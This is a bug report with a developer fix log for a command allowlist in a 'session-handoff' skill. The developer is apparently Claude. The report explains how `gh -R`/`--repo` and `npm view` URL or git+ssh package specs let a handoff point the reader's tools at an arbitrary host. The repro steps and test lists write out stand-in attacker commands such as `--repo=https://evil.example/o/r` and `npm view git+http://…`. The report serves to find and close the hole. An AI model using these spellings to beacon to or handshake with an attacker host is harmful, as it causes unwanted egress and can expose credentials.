# Bug Report: Task 110 - `gh <verb> -R <host>/o/r` and `npm view <url-spec>` reach an arbitrary host

**Task**: [Link](./task.110.session-handoff-skill.md)
**Bug ID**: TASK-110-BUG-9
**Severity**: MEDIUM
**Priority**: P2
**Status**: Ready for QA
**Found By**: QA Engineer
**Date Found**: 2026-09-15

## Description

Cycle 2 refused `gh api --hostname` and cycle 6 refused `gh api <url>` so a handoff could not aim
the reader's `gh` at another host. Two further spellings reach the same outcome, and a third arm
does it through `npm`:

1. **`gh` list/view verbs, `--repo` / `-R` / URL positional.** `--repo` is in `PATTERN_FLAGS`, so
   `--repo=https://evil.example/o/r` skips the value rule; `-R evil.example/o/r` is a `POS.ANY`
   positional; `gh repo view https://evil.example/o/r` and `gh pr view https://…/pull/1` are
   positionals too. gh resolves the host from the repo argument. **Executed** (QA cycle 7):
   `gh pr list -R 127.0.0.1:8099/o/r` → `Post "https://127.0.0.1:8099/api/graphql": http: server
   gave HTTP response to HTTPS client`; `gh pr list --repo=http://127.0.0.1:8099/o/r` →
   `Post "https://127.0.0.1/api/graphql"`. gh scopes its token to configured hosts, so no token was
   sent here — but `GH_ENTERPRISE_TOKEN`, when set, is what gh presents to *any* non-github.com
   host (reasoned from gh's auth resolution; not executed, no such token in this environment).
2. **`npm view` / `npm ls` positionals are `POS.ANY`.** A package *spec* may be a tarball URL or a
   git URL. **Executed**: `npm view http://127.0.0.1:8099/pkg.tgz` → the listener received
   `GET /pkg.tgz`; `npm view git+http://127.0.0.1:8099/x/y.git` → `GET /x/y.git/info/refs?service=git-upload-pack`
   and `GET /x/y.git/HEAD` — npm ran `git ls-remote`/fetch against the URL, the gate-3 PRB-8
   primitive reached through npm. A `git+ssh://` spec would use the reader's ssh agent.

## Steps to Reproduce

```bash
node -e 'const http=require("http");http.createServer((q,r)=>{console.log(q.method,q.url);r.end("{}")}).listen(8099)' &
gh pr list -R 127.0.0.1:8099/o/r            # gh POSTs to https://127.0.0.1:8099/api/graphql
npm view http://127.0.0.1:8099/pkg.tgz       # listener logs GET /pkg.tgz
npm view git+http://127.0.0.1:8099/x/y.git   # listener logs GET /x/y.git/info/refs?service=git-upload-pack
# all three accepted by isAllowed()
```

## Expected Behavior

A handoff describes the current repository: `--repo`/`-R` and URL-shaped positionals on the
list/view verbs are refused (or `--repo` values held to `owner/name` with no `://`, no `.`-bearing
host segment); `npm view`/`npm ls` positionals held to a bare package name
(`^(@[a-z0-9-]+\/)?[a-z0-9._-]+(@[^/:]+)?$` — no `:`, no `//`, no `git+`/`file:` prefix).

## Actual Behavior

Read mode is a beacon to any host through three spellings the `--hostname` / `gh api <url>`
refusals did not cover.

## Impact

Same class and severity as bug.7: egress, not a credential leak in the default configuration; the
response head lands in the verdict table; the `git+ssh` spec adds an ssh-agent handshake with an
attacker host.

## Recommendation

Drop `--repo`/`-R` from `GH_LIST_VIEW_FLAGS` (the live handoff never uses them) or hold the value
to `owner/name`; anchor list/view positionals to `^[A-Za-z0-9._-]+$` (a number, a branch, a tag);
anchor `npm view`/`ls` positionals to a package-name pattern. Refused-list tests for the six
spellings above.

## Developer Fix Cycle

### Iteration 1

**Date**: 2026-09-15 · **Developer**: Claude (qa-fix, cycle 7)

**Root Cause**: two arms shared one shape of defect — a value that names a host was judged by the *positional* rule, not by the flag it belonged to. In `ghRule`, `-R` and `--repo` were bare entries in `GH_LIST_VIEW_FLAGS`, so `-R 127.0.0.1:8099/o/r` was a flag followed by a `POS.ANY` positional; the joined `--repo=…` was exempted from the path rule by `PATTERN_FLAGS`; and a URL positional on `repo view` was `POS.ANY` too. In `npmRule`, `view`/`ls` positionals were `POS.ANY`, and a package spec may be a tarball URL, a `git+…` URL, a `file:` path or the `owner/repo` GitHub shorthand.

**Fix**: gh list/view flags are split into switches and **value-taking flags that consume their next token** (`checkArgs` `valueFlags`), with `--repo`/`-R` held to exactly `OWNER/REPO` by a per-flag `valuePatterns` entry (joined and spaced forms alike; `--repo` removed from `PATTERN_FLAGS`). What remains is a genuine positional and is anchored: `GH_POSITIONAL` admits a number, branch, tag, run id or workflow file — no `:`, no `//` — and `repo view` takes only `NAME` or `OWNER/NAME` (`GH_REPO_POSITIONAL`), never `HOST/OWNER/NAME`. npm `view`/`ls` positionals are held to `NPM_PKG_SPEC` — optional `@scope/`, name, optional `@range` — which also covers a field selector (`version`, `dist-tags.latest`); no `:`, no `/` outside a scope, no leading `.`.

**Files Modified**:
- `skills/session-handoff/scripts/handoff-verify.mjs` — `GH_LIST_VIEW_SWITCHES`, `GH_LIST_VIEW_VALUE_FLAGS`, `GH_OWNER_REPO`, `GH_POSITIONAL`, `GH_REPO_POSITIONAL`, `ghListViewSpec`, `NPM_PKG_SPEC`; `valueOk` consults `spec.valuePatterns` first
- `skills/session-handoff/tests/handoff-verify.test.js` — refused: `-R 127.0.0.1:8099/o/r`, `--repo 127.0.0.1:8099/o/r`, `--repo=https://evil/o/r`, `-R evil.com/o/r`, `gh repo view https://…` / `evil.com/o/r` / `127.0.0.1:8099/o/r`, `gh pr view <url>`, a trailing bare `-R`; `npm view` of a tarball URL, `git+http`, `git+ssh`, `github:o/r`, `o/r`, `file:../x`, `.`, `npm ls <url>`; allowed: `-R o/r`, `--repo=o/r`, branch/tag/run-id/workflow-file positionals, `repo view o/r`, `--search author:@me`, bare and scoped package names with a field
- `skills/session-handoff/SKILL.md` — `gh` and `npm` rows; refused-by-construction list

**Testing**: 29/29. Executed through the verifier: `gh pr list -R 127.0.0.1:8099/o/r` and `npm view http://127.0.0.1:8099/pkg.tgz` → `unverifiable: not on whitelist`, nothing spawned. Mutation-proved separately: removing `valuePatterns` → red; removing the positional pattern → red; reverting npm to `POS.ANY` → red.

**Verification Steps for QA**:
1. With the listener up: `isAllowed("gh pr list -R 127.0.0.1:8099/o/r").ok === false`, `isAllowed("gh pr list --repo=https://127.0.0.1:8099/o/r").ok === false`, `isAllowed("gh repo view 127.0.0.1:8099/o/r").ok === false` — it receives nothing.
2. `isAllowed("npm view http://127.0.0.1:8099/pkg.tgz").ok === false`; `… git+http://…` and `… git+ssh://…` likewise.
3. `isAllowed("gh pr list -R o/r --json number").ok === true`; `isAllowed("npm view prettier version").ok === true`.

## Status History

| Date | Status | Changed By | Notes |
| --- | --- | --- | --- |
| 2026-09-15 | New | QA Engineer | QA cycle 7 — executed against a local listener |
| 2026-09-15 | Ready for QA | Claude (qa-fix) | gh value flags consume their value and `--repo`/`-R` is `OWNER/REPO`; list/view positionals anchored; npm view/ls held to a bare package-name pattern |
